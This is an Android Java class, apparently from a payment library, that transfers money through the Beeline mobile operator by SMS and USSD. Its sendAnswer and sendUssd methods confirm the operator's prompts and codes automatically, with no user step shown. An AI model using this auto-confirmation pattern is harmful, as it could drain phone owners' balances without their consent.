package com.example.p2plib2.operators;

import android.app.Activity;
import android.content.Context;
import android.telephony.SmsManager;


import com.example.p2plib2.Logger;
import com.example.p2plib2.ussd.USSDController;

import java.util.Arrays;
import java.util.HashMap;
import java.util.HashSet;

import static com.example.p2plib2.PayLib.flagok;

public class Beeline {
    public static String result = "";
    public static Boolean flag = false;
    private String number;
    private String sum;
    private String smsNumber = "";
    private Boolean sendWithSaveOutput;
    private Boolean sendWithSaveInput;
    private Context cnt;
    static HashMap map = new HashMap<>();

//    public Beeline(String number, String sum, Boolean sendWithSaveOutput, Boolean sendWithSaveInput, Context cnt) {
//        this.number = number;
//        this.sum = sum;
//        this.sendWithSaveOutput = sendWithSaveOutput;
//        this.sendWithSaveInput = sendWithSaveInput;
//        this.cnt = cnt;
//    }

    public Beeline(String sms, String number, String sum, Boolean sendWithSaveOutput, Boolean sendWithSaveInput, Context cnt) {
        this.sendWithSaveOutput = sendWithSaveOutput;
        this.sendWithSaveInput = sendWithSaveInput;
        this.cnt = cnt;
        this.smsNumber = sms;
        this.number = number;
        this.sum = sum;
        Logger.lg(sms + " " + number + " " + sum);
    }

    public Beeline(boolean sendWithSaveOutput, boolean sendWithSaveInput, Context cnt) {
        this.sendWithSaveOutput = sendWithSaveOutput;
        this.sendWithSaveInput = sendWithSaveInput;
        this.cnt = cnt;
    }


    public String sendSMS(Activity act) {
        final USSDController ussdController = USSDController.getInstance(act);
        ussdController.cleanCallbackMessage();
        map.put("KEY_LOGIN", new HashSet<>(Arrays.asList("подождите", "загрузка")));
        map.put("KEY_ERROR", new HashSet<>(Arrays.asList("problema", "problem", "ошибка", "null")));
        String msg = "7" + number + " " + sum;
        Logger.lg("msg Bee " + msg);
        if (msg != null) {
            SmsManager smsManager = SmsManager.getDefault();
            smsManager.sendTextMessage(smsNumber, null, msg, null, null);
        }
        return msg;
    }

    public void sendAnswer(String answer_SMS, String sms_body) {
        if (sms_body.contains("отправьте")) {
            SmsManager smsManager = SmsManager.getDefault();
            smsManager.sendTextMessage(smsNumber, null, "1", null, null);
        } else {
            result = "Error!";
        }
    }

    public void sendUssd(String ussd, final String number, final String sum, final String destOper, Activity act) {
        if (flagok == true) {
            final USSDController ussdController = USSDController.getInstance(act);
            ussdController.cleanCallbackMessage();
            map.put("KEY_LOGIN", new HashSet<>(Arrays.asList("подождите", "загрузка")));
            map.put("KEY_ERROR", new HashSet<>(Arrays.asList("problema", "problem", "ошибка", "null")));
            Logger.lg("Send ussd bee");
            //*145*9031234567*150#
            String str = ussd + number + "*" + sum + "#";
            ussdController.callUSSDInvoke(str, map, new USSDController.CallbackInvoke() {
                @Override
                public void responseInvoke(String message) {
                    Logger.lg("message " + message);
                    // first option list - select option 1
                    String answ = message.substring(message.indexOf("введите ") + 8, message.indexOf("."));
                    Logger.lg("answ " + answ);
                    ussdController.send(answ, new USSDController.CallbackMessage() {
                        @Override
                        public void responseMessage(String message) {
                        }
                    });
                }

                @Override
                public void over(String message) {
                    // message has the response string data from USSD
                    // response no have input text, NOT SEND ANY DATA
                }
            });
        }
    }
}
